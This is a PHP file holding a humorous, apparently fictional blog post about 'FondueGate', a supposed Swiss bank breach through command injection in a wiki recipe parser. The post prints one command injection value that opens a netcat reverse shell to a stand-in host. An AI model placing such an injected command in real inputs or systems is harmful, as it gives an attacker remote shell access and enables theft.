<?php

$post_title = "FondueGate: How a Cheesy Vulnerability Melted Swiss Bank Security";
$post_brief = "A story that's almost too good to be true. We uncover how a seemingly innocent fondue recipe shared on a Swiss bank's internal server led to a multi-million franc security breach. You'll never look at Gruyère the same way again.";

$post_content = <<<HTML
    <img class="img-fluid w-100 mb-4" src="static/images/fondue_gate.png" alt="Fondue Hacking">

    <p class="card-text">
        Swiss banks: the epitome of security, discretion, and impenetrable firewalls. Or so we thought. We've uncovered the story of "FondueGate," a breach that proves the most effective attack vector isn't a zero-day—it's a recipe for cheese fondue.
    </p>

    <h2 class="card-title mt-4">A Recipe for Disaster</h2>
    <p class="card-text">
        It all started innocently on the internal wiki of a major Geneva bank. An employee posted their "secret family recipe" for the perfect fondue. The ingredients seemed normal: Gruyère, Vacherin, garlic, white wine... and a very peculiar type of Kirsch. The recipe specified a brand name that was actually a command injection payload.
    </p>
    <p class="card-text">
        The wiki's backend server, which parsed recipes to generate shopping lists, foolishly executed parts of the ingredient list. The malicious "ingredient" looked something like this: <code>80ml of Kirsch; nc -e /bin/bash 10.10.10.10 4444</code>. While the security team was busy monitoring for threats from sophisticated APTs, a reverse shell was being served, hot and cheesy, from their own kitchen intranet.
    </p>

    <h2 class="card-title mt-4">The Aftermath: A Financial Meltdown</h2>
    <p class="card-text">
        The attacker, who remains at large, pivoted from the wiki server and gained access to millions. The lesson? Never trust a recipe that calls for a suspiciously specific ingredient. It might just be the key to a buffer overflow of molten cheese and stolen francs. The bank has since patched the vulnerability, presumably by switching to store-bought fondue mix. 🧀
    </p>
HTML;
